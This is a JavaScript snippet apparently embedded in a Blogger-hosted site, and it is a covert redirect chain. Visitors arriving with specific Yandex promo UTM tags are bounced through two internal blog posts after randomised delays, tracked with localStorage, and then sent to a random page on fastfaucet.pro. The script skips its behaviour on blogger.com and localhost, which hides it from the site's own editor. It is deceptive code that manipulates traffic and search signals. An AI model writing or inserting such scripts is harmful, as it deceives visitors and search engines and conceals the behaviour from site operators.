//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
        "https://www.mybiz24.ru/2024/11/blog-post.html",
        "https://www.mybiz24.ru/2024/11/10-2024.html",
        "https://www.mybiz24.ru/2024/11/seo.html",
        "https://www.mybiz24.ru/2024/11/blog-post_3.html",
        "https://www.mybiz24.ru/2024/11/blog-post_30.html",
        "https://www.mybiz24.ru/2024/11/blog-post_20.html",
        "https://www.mybiz24.ru/2024/11/blog-post_33.html",
        "https://www.mybiz24.ru/2024/11/blog-post_18.html",
        "https://www.mybiz24.ru/2024/11/blog-post_37.html",
        "https://www.mybiz24.ru/2024/11/blog-post_36.html"
    ];

    const externalLinks = [
    "https://fastfaucet.pro/newalfa4/mybiz24.php",
	"https://fastfaucet.pro/newalfa4/vebma.php",
	"https://fastfaucet.pro/newalfa4/vverhsite.php",
	"https://fastfaucet.pro/newalfa4/lista4.php",
	"https://fastfaucet.pro/newalfa4/gidrossii.php",
	"https://fastfaucet.pro/newalfa4/kuhnyaonline.php",
	"https://fastfaucet.pro/newalfa4/optimizeds.php",
	"https://fastfaucet.pro/newalfa4/smyslu.php",
	"https://fastfaucet.pro/newalfa4/proryvit.php",
	"https://fastfaucet.pro/newalfa4/tormoshka.php",
	"https://fastfaucet.pro/newalfa4/rukovoditelstvo.php",
	"https://fastfaucet.pro/newalfa4/perviyshagi.php",
	"https://fastfaucet.pro/newalfa4/bythack.php",
	"https://fastfaucet.pro/newalfa4/tvoyastrategiya.php",
    "https://fastfaucet.pro/newalfa4/ecominds.php"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();
//]]>